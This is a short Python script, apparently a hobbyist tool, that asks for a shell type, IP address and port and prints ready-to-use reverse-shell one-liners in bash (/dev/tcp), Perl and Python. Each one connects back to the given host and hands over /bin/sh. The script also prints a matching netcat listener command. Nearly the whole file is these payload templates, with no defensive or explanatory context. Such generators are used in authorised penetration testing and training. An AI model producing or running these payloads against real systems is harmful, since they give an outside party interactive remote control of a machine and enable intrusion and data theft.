#! /usr/bin/env python

# Created by d0nkeyk0ng787/gnome787

# Simple reverse shell generator
# Probably not the most practical script but it does work

def gen_shell(shell, ip, port):
	
	if shell.lower() == 'bash':
		print("Your bash shell is: bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port))
	elif shell.lower() == 'perl':
		print("Your perl shell is: perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip, port))
	elif shell.lower() == 'python':
		print("Your python shell is: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ip, port))

def nc_listener(port):
	print("Your netcat listener command is: nc -lnvp " + port)


def shell_list():

	print("Here is a list of reverse shells this script can generate!")
	print("Bash")
	print("PERL")
	print("Python")
	

def main():

	usage = True
	shells = ["bash", "perl", "python"]

	print("Welcome to d0nkeyk0ngs reverse shell generator. Enter help for a list of shells you can generate!")
	print("Alternatively, type quit to exit the script!")
	
	while usage:

		selection = input("Which reverse shell would you like to generate: ")
		print(selection)

		if selection.lower() == "help":
			shell_list()
		else:
			if selection.lower() in shells:
				ip = input("Enter the IP you want the shell sent to: ")
				port = input("Enter the port you wish to use: ")
				gen_shell(selection, ip, port)
				nc_listener(port)
				break
			elif selection.lower() == 'quit':
				print("Quitting")
				usage = False
				break
			else:
				print("Please make a valid selection")
				break

if __name__ == '__main__':

	main()
